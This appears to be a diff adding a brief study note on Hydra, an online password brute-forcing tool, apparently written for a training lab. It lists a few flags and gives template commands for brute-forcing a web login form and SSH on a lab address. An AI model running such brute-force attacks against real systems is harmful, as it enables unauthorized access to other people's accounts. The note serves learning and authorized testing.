@@ -1,0 +1,19 @@
+>Hydra<
+
+Hydra is a Brute force online password cracking program.
+
+Supports a lot of different protocols -> https://github.com/vanhauser-thc/thc-hydra
+
+>Hydra commands<
+
+-l Specifies the username for login
+-P specifies the password text file list
+-t sets the number of threads to spawn
+
+Brute force webforms
+
+sudo hydra <username> <wordlist> 10.10.43.39 http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+SSH
+
+hydra -l <username> -P <full path to pass> 10.10.43.39 -t 4 ssh
